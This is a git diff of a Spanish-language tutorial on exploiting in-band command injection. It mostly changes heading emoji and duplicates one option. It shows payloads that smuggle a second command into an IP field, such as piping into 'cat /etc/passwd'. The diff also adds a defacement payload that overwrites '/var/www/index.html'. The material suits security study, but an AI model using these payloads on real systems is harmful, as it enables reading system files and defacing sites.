@@ -4,9 +4,9 @@
 
 Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a explotar de las siguientes maneras: 
 
-### 💥 `In-Band CMDI: exploitation`
+### 💣 `In-Band CMDI: exploitation`
 
-1. Utilizar `shell metacharacters` como payload inicial:
+1. 💥 Utilizar `shell metacharacters` como payload inicial:
 
 ````py
 ## General deny list to be included for command injection:
@@ -20,7 +20,7 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 
 ````
 
-2. **Concatenar** comandos:
+2. 💥 **Concatenar** comandos:
 
 ````py
 ## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)
@@ -37,6 +37,9 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 ### Opción 4:
 127.0.0.1 | cat /etc/passwd &
 
+### Opción 4:
+127.0.0.1 | cat /etc/passwd &
+
 .
 .
 .
@@ -45,6 +48,11 @@ etc
 
 ````
 
+- Algo un poco mas complejo como un `defacement` se podría ver algo así:
+
+````sh
+127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/index.html
+````
 
 
 
